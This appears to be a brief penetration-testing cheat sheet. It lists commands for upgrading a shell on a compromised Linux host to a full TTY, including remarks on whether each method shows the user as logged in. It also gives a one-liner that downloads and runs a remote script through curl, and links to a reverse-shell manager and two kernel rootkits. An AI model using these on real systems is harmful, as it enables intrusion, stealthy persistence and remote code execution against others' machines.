
<h3>Commands:</h3>

<br />

- **Spawn TTY shell**: `/usr/bin/script -qc /bin/bash /dev/null`
> Note: This method shows yourself logged in.

<br />

- **Spawn Python TTY Shell**: `python -c 'import pty;pty.spawn("/bin/bash")'`
> Note: This method doesn't show yourself logged in.

<br />

- **Add PWD in bash**: `PS1='\u@\h:\w\$ '`

<br />

- **Run script from URL**: `source <(curl -s http://mywebsite.com/myscript.sh)`

<br />

<h3>External Links:</h3>

<br />

- **Multiple reverse shell sessions/clients manager**: https://github.com/WangYihang/Platypus

<br />

- **Simple LKM rootkit for Linux Kernels 2.6.x/3.x/4.x/5.x and ARM64**: https://github.com/m0nad/Diamorphine

<br />

- **Advanced LKM rootkit for Linux Kernels 2.6.x/3.x/4.x/5.x and ARM64**: https://github.com/f0rb1dd3n/Reptile

<br />
